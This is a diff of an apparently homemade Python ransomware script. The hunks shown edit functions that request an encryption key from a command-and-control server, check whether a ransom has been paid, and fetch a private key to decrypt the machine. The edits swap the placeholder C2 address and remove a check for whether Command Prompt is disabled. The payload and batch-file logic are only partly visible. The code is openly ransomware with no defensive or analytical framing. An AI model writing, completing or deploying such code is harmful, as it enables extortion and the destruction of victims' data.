@@ -64,17 +64,6 @@ print("Just created the bat")
 with open(batch_file, 'w') as f:
     f.write(batch_content)
 
-def check_cmd_disabled():
-    try:
-        # Try to run a basic command in Command Prompt
-        subprocess.run(["cmd", "/c", "echo Hello, World!"], check=True)
-        print("Command Prompt is enabled.")
-    except subprocess.CalledProcessError as e:
-        print("Command Prompt seems to be disabled.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
-
-
 def windows_payload():
     try:
         # subprocess.run(
@@ -94,7 +83,7 @@ def windows_payload():
 # connect to C2 server
 def c2_server():
     try:
-        response = requests.get("http://INSERT IP:3000/gen-key") # send GET request for public key
+        response = requests.get("http://----:3000/gen-key") # send GET request for public key
         if response.status_code == 200:
             public_key = response.text.strip() # retrieve public key
             print("Public key had been received")
@@ -144,7 +133,7 @@ def payment_check():
             pub_key = pub_key_file.read().strip()
 
         # send a POST request
-        response = requests.post("http://INSERT IP:3000/check-payment", json={"pub_key": pub_key})
+        response = requests.post("http://----:3000/check-payment", json={"pub_key": pub_key})
 
         if response.status_code == 200:
             # decrypt the machine if payment is confirmed
@@ -164,7 +153,7 @@ def dec_machine():
             encrypted_data = enc_file.read()
         
         # send POSt to get prvate key
-        response = requests.post("http://INSERT IP:3000/check-payment", json={"pub_key": pub_key})
+        response = requests.post("http://----:3000/check-payment", json={"pub_key": pub_key})
 
         if response.status_code == 200:
             # if private key is received, decrypt file
@@ -185,7 +174,6 @@ def dec_machine():
         print(f"Error decrypting machine: {e}")
 
 windows_payload()
-check_cmd_disabled()
 c2_server()
 
 
